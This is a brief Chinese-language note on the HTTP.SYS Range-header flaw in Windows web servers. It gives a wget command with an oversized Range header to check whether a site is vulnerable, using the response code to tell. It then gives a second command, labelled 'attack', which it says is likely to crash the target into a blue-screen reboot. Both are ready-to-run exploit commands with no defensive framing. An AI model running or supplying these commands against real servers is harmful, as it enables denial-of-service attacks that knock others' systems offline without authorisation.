# HTTP.SYS

可以使用`wget`工具亦或发送特殊请求头的`HTTP`包

## wget

### 测试：

> 此方法一般不会造成目标宕机

`wget --header="Range: bytes=0-18446744073709551615" [站点的图片地址]`

如果`response_code`为`416`表示漏洞存在

如果`response_code`为`400`表示漏洞已修复

### 攻击

> 以下方法很有可能引起目标宕机，蓝屏重启：

`wget --header="Range: bytes=18-18446744073709551615" [站点的图片地址]`